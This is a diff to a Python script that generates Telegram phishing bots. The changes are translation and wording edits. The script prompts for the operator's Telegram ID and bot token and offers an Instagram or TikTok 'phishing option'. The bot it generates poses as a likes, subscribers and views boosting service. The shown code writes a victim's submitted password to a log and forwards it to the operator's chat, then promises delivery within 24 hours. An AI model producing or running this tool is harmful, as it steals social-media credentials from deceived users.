@@ -71,28 +71,28 @@ def validate_input(prompt, input_type=str):
         if input_type == int:
             if user_input.isdigit():
                 return int(user_input)
-            print("Ошибка: введите число!")
+            print("Error: enter a number!")
         else:
             if user_input.strip():
                 return user_input
-            print("Ошибка: ввод не может быть пустым!")
+            print("Error: input cannot be empty!")
 
-userid = validate_input('\033[93mВведите свой Telegram ID > \033[0m')
-token = validate_input('\033[94mВведите токен бота > \033[0m')
+userid = validate_input('\033[93mEnter your Telegram ID > \033[0m')
+token = validate_input('\033[94mEnter the bot token > \033[0m')
 
 print('''\033[96m
 [1] Instagram
 [2] Tiktok
 \033[0m''')
 
-choice = validate_input('\033[95mВыберите вариант фишинга в боте>>> \033[0m', int)
+choice = validate_input('\033[95mSelect a phishing option in the bot>>> \033[0m', int)
 
 def generate_bot_script(platform_name):
     return f"""import telebot
 from telebot import types
 import time
 
-print("Бот запущен и готов к работе!")
+print("The bot is up and running!")
 log = open('bot-log.txt', 'a+', encoding='utf-8')
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
@@ -100,7 +100,7 @@ bot = telebot.TeleBot("{token}")
 try:
     bot.send_message(ID, '!The bot is up and running!')
 except:
-    print("Error: you may not have written /start to the bot!")
+    print("Error: you may not have initiated /start with the bot!")
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -112,13 +112,13 @@ To get started, press /tipping''')
 def start_nacrutka(message):
     keyboard = types.InlineKeyboardMarkup(row_width=2)
     buttons = [
-        types.InlineKeyboardButton("Barkers❤️", callback_data="likes"),
+        types.InlineKeyboardButton("Likes❤️", callback_data="likes"),
         types.InlineKeyboardButton("Subscribers📃", callback_data="subs")
     ]
     if platform_name.lower() == 'tiktok':
         buttons.extend([
             types.InlineKeyboardButton("Views👁️", callback_data="views"),
-            types.InlineKeyboardButton("reposts🔄", callback_data="reposts")
+            types.InlineKeyboardButton("Reposts🔄", callback_data="reposts")
         ])
     keyboard.add(*buttons)
     bot.send_message(message.chat.id, "Choose an option:", reply_markup=keyboard)
@@ -164,9 +164,9 @@ Password: {password}
     log.write(log_data)
     bot.send_message(ID, log_data)
     
-    bot.reply_to(message, 'Thank you! Expect a tipping within 24 hours!')
+    bot.reply_to(message, 'Thank you! Expect tipping within 24 hours!')
     time.sleep(1)
-    bot.send_message(message.chat.id, '⚠️ Don't give your details to anyone!')
+    bot.send_message(message.chat.id, '⚠️ Don\'t give your details to anyone!')
 
 bot.polling()
 """
